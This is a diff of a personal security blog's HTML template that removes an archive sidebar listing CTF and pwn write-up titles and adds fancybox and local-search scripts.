-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-    
-    
-    
-    
-    <div class="total-and-search">
-        <div class="total-archive">
-        Total : 64
-        </div>
-        <!-- search  -->
-        
-    </div>
-    
-    <div class="post-archive">
-    
-        
-            
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/29</span>
-            <a class="archive-post-title" href="/2025/04/29/hackergame2024%E5%A4%8D%E7%8E%B0/">hackergame2024复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/09</span>
-            <a class="archive-post-title" href="/2025/04/09/Squ1rrelCTF/">Squ1rrelCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/KnightCTF/">KnightCTF</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/23</span>
-            <a class="archive-post-title" href="/2024/10/23/geekgame2024/">geekgame2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/07</span>
-            <a class="archive-post-title" href="/2024/09/07/byuctf-iot/">byuctf_iot</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/02</span>
-            <a class="archive-post-title" href="/2024/09/02/gdbjail/">gdbjail</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/01</span>
-            <a class="archive-post-title" href="/2024/08/01/ImaginaryCTF/">ImaginaryCTF</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/22</span>
-            <a class="archive-post-title" href="/2024/07/22/dasctf2024-summer-challenge/">dasctf2024_summer_challenge</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/30</span>
-            <a class="archive-post-title" href="/2024/06/30/d3ctf-pwnshell%E5%A4%8D%E7%8E%B0/">d3ctf_pwnshell复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/04</span>
-            <a class="archive-post-title" href="/2024/06/04/litctf2024-pwn/">litctf2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/27</span>
-            <a class="archive-post-title" href="/2024/05/27/DragonKnightCTF-pwn/">DragonKnightCTF_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span>
-            <a class="archive-post-title" href="/2024/05/22/ciscn-pwn/">ciscn_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/15</span>
-            <a class="archive-post-title" href="/2024/05/15/hnctf-pwn/">hnctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/14</span>
-            <a class="archive-post-title" href="/2024/05/14/miniL2024-pwn/">miniL2024_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/hznuctf/">hznuctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/24</span>
-            <a class="archive-post-title" href="/2024/04/24/geekcon/">geekcon</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span>
-            <a class="archive-post-title" href="/2024/03/15/CyberApocalypse-2024-Hacker-Royale-wp/">CyberApocalypse_2024_Hacker_Royale_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/27</span>
-            <a class="archive-post-title" href="/2024/02/27/hgame2024week3-wp/">hgame2024week3_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/hgame2024week2-pwn-wp/">hgame2024week2_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/11</span>
-            <a class="archive-post-title" href="/2024/02/11/0xl4ugh-pwn/">0xl4ugh_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span>
-            <a class="archive-post-title" href="/2024/02/07/hgame2024week1-wp/">hgame2024week1_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/06</span>
-            <a class="archive-post-title" href="/2024/02/06/beginctf2024-wp/">beginctf2024_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/02</span>
-            <a class="archive-post-title" href="/2024/01/02/cbctf/">cbctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/GeekChallenge2023/">GeekChallenge2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/hackergame2023/">Hackergame2023</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/29</span>
-            <a class="archive-post-title" href="/2023/11/29/isctf/">isctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">11/05</span>
-            <a class="archive-post-title" href="/2023/11/05/newstar-week2/">newstar_week2</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/21</span>
-            <a class="archive-post-title" href="/2023/10/21/0xgame/">0xgame</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/26</span>
-            <a class="archive-post-title" href="/2023/09/26/exp%E6%9C%AC%E5%9C%B0%E4%B8%8D%E9%80%9A%E8%BF%9C%E7%A8%8B%E9%80%9A%E7%9A%84%E9%97%AE%E9%A2%98/">exp本地不通远程通的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cdn%E7%BB%95%E8%BF%87%E5%A4%A7%E5%85%A8tips%E6%80%9D%E8%B7%AF/">cdn绕过大全tips思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/cnss2023/">cnss2023</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> Invalid date </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">Invalid date</span>
-            <a class="archive-post-title" href="/2023/09/18/hello-world/">Hello World</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2025 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/03</span>
-            <a class="archive-post-title" href="/2025/05/03/rust%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E6%89%80%E6%9C%89%E6%9D%83%E4%B8%8E%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E7%AE%A1%E7%90%86/">rust入门_数据所有权与生命周期管理</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/27</span>
-            <a class="archive-post-title" href="/2025/01/27/x3ctf/">x3ctf</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2024 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/04</span>
-            <a class="archive-post-title" href="/2024/09/04/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024pwn/">羊城杯2024pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/nss3rd%E5%87%BA%E9%A2%98-Iterator-Trap%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">nss3rd出题_Iterator_Trap解题思路</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/srctf-pwn%E5%87%BA%E9%A2%98/">srctf_pwn出题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/31</span>
-            <a class="archive-post-title" href="/2024/08/31/xyctf/">xyctf</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span>
-            <a class="archive-post-title" href="/2024/08/25/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">羊城杯2023部分题目复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/22</span>
-            <a class="archive-post-title" href="/2024/08/22/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A81/">奇奇怪怪格式化字符串漏洞的利用1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/08</span>
-            <a class="archive-post-title" href="/2024/08/08/tfcctf2024/">tfcctf2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">07/15</span>
-            <a class="archive-post-title" href="/2024/07/15/wkctf-pwn/">wkctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/25</span>
-            <a class="archive-post-title" href="/2024/06/25/xctf-ggbord%E5%A4%8D%E7%8E%B0/">xctf_ggbord复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">06/19</span>
-            <a class="archive-post-title" href="/2024/06/19/vsctf-pwn/">vsctf_pwn</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span>
-            <a class="archive-post-title" href="/2024/05/30/xctf-BuggyAllocator%E5%A4%8D%E7%8E%B0/">xctf_BuggyAllocator复现</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">05/23</span>
-            <a class="archive-post-title" href="/2024/05/23/xv6-and-unix-utilities/">xv6_and_unix_utilities</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">04/28</span>
-            <a class="archive-post-title" href="/2024/04/28/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bpwn%E6%96%B9%E5%90%91wp/">中国海洋大学信息安全竞赛pwn方向wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/31</span>
-            <a class="archive-post-title" href="/2024/03/31/%E5%B0%9D%E8%AF%95%E7%BC%96%E8%AF%91kernel%E5%92%8C%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/">尝试编译kernel和文件系统</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/27</span>
-            <a class="archive-post-title" href="/2024/03/27/nkctf-wp/">nkctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/10</span>
-            <a class="archive-post-title" href="/2024/03/10/pearlctf-wp/">pearlctf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/04</span>
-            <a class="archive-post-title" href="/2024/03/04/osu-gaming-CTF-2024/">osu!gaming_CTF_2024</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/25</span>
-            <a class="archive-post-title" href="/2024/02/25/sictfr3-pwn-wp/">sictfr3_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/14</span>
-            <a class="archive-post-title" href="/2024/02/14/nssr18-wp/">nssr18_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/31</span>
-            <a class="archive-post-title" href="/2024/01/31/rw%E4%BD%93%E9%AA%8C%E8%B5%9Bwp/">rw体验赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/26</span>
-            <a class="archive-post-title" href="/2024/01/26/nssctfr16-wp/">nssctfr16_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/24</span>
-            <a class="archive-post-title" href="/2024/01/24/%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9Bwp/">春秋杯冬季赛wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/19</span>
-            <a class="archive-post-title" href="/2024/01/19/pwnable-tw/">pwnable.tw</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/18</span>
-            <a class="archive-post-title" href="/2024/01/18/uoftctf-pwn-wp/">uoftctf_pwn_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">01/04</span>
-            <a class="archive-post-title" href="/2024/01/04/pwnable-kr/">pwnable.kr</a>
-        </li>
-    
-        
-            
-            
-                
-                </ul>
-            
-            <div class="archive-year"> 2023 </div>
-            <ul class="year-list">
-            
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/">php弱类型</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/python3-venv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8-%E8%A7%A3%E5%86%B3%E5%8C%85%E7%AE%A1%E7%90%86%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E6%B7%B7%E4%B9%B1%E7%9A%84%E9%97%AE%E9%A2%98/">python3-venv虚拟环境使用-解决包管理版本控制混乱的问题</a>
-        </li>
-    
-        
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/18</span>
-            <a class="archive-post-title" href="/2023/09/18/sictf2023r2/">sictf2023</a>
-        </li>
-    
-    </div>
-</div>
-
-        <div class="sidebar-panel-tags">
-    <div class="sidebar-tags-name">
-        
-            <span class="sidebar-tag-name" data-tags="ctf writeup">
-                <span class="iconfont-archer">&#xe606;</span>
-                ctf writeup
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="misc">
-                <span class="iconfont-archer">&#xe606;</span>
-                misc
-            </span>
-        
-            <span class="sidebar-tag-name" data-tags="os">
-                <span class="iconfont-archer">&#xe606;</span>
-                os
-            </span>
-        
-    </div>
-    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
-    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
-        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
-    </div> 
-    <div class="sidebar-tags-list"></div>
-</div>
-
-        <div class="sidebar-panel-categories">
-    <div class="sidebar-categories-name">
-    
-    </div>
-    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
-    <div class="sidebar-categories-list"></div>
-</div>
-
-    </div>
-</div>
-
-        <!-- site-meta -->
-        <script>
-    var siteMetaRoot = "/"
-    if (siteMetaRoot === "undefined") {
-        siteMetaRoot = '/'
-    }
-    var siteMeta = {
-        url: "https://nyyyddddn.github.io",
-        root: siteMetaRoot,
-        author: "nyyyddddn"
-    }
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
 </script>
 
-        <!-- import experimental options here -->
-        <!-- Custom Font -->
 
 
-        <!-- main func -->
-        <script src="/scripts/main.js?v=20211217"></script>
-        <!-- dark mode -->
-        <script src="/scripts/dark.js?v=20211217"></script>
-        <!-- fancybox -->
-        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
-        <!-- algolia -->
-        
-        <!-- busuanzi -->
-        
-            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
-        
-        <!-- CNZZ -->
-        
-        <!-- async load share.js -->
-        
-            <script src="/scripts/share.js?v=20211217" async></script>
-        
-        <!-- mermaid -->
-        
-    </body>
-</html>
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
